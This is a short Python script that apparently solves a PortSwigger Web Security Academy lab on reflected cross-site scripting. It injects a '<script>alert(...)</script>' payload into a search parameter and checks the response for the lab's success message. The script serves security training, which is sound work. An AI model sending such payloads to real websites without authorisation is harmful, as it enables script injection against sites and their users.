import requests
import argparse

# https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to spcify a target.")
    print("[*] Example usage: xss01-reflected.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# create the payload
payload = args.target + "/?search=<script>alert('twitch.tv/offsecprep')</script>"
print('[*] Payload created: ' + payload)

r = requests.get(payload)
if r.status_code == 200:
    print('[*] Payload sent')
    # check the content of the response
    completion_text = b'Congratulations'
    if completion_text in r.content:
        print('[*] Success')
else:
    print('[!] Exploit failed')
    exit(0)
